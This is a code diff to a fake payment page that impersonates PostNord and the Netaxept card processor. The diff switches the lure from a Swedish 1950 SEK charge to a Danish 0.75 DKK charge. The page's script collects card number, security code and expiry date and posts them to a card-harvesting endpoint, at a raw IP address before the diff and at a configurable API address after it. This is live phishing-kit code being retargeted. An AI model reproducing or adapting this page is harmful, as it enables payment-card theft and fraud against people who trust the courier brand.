@@ -7,9 +7,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>pay</title>
   <link rel="stylesheet" href="./css/pay.css" />
-  <script src="./js/rem.js"></script>
-  <script src="./js/jquery-1.8.3.min.js"></script>
-  <script src="./js//websocket.js"></script>
+  <script src="js/rem.js"></script>
+  <script src="js/jquery-1.8.3.min.js"></script>
+  <script src="js/websocket.js"></script>
 </head>
 
 <body>
@@ -17,23 +17,23 @@
     <div class="header">
       <h2>Netaxept</h2>
       <div class="empy"></div>
-      <img src="./img/nets.png" alt="" />
+      <img src="img/nets.png" alt="" />
     </div>
     <div class="main">
       <div class="main_header">
-        <img src="./img/sx.png" alt="" />
-        <p style="margin-left: 0.3rem">PostNord Sverige AB</p>
+        <img src="img/sx.png" alt="" />
+        <p style="margin-left: 0.3rem">PostNord Denmark A/S</p>
       </div>
       <div class="main_center">
         <br />
         <br />
         <p>
           Merchant：
-          <span>PostNord Sverige AB</span>
+          <span>PostNord Denmark A/S</span>
         </p>
         <p>
           Amount：
-          <span>1950,00 (SEK)</span>
+          <span>0.75 (DKK)</span>
         </p>
         <br />
         <p>
@@ -48,7 +48,7 @@
         <input type="text" oninput="checkStrLong()" id="nbsp" maxlength="19" oninput="value=value.replace(/[^0-9]/g,'')"
           placeholder="0000 0000 0000 0000" />
         <div class="tip">
-          <img src="./img/gantan.png" alt="" />
+          <img src="img/gantan.png" alt="" />
           <i>The card was entered incorrectly, please re-enter it</i>
         </div>
         <br />
@@ -132,7 +132,7 @@
           data.securityCode = code;
           data.expDate = month + '/' + year;
 
-          fetch('https://155.94.182.31:8080user/addCardInfo', {
+          fetch(API_URL + '/user/addCardInfo', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
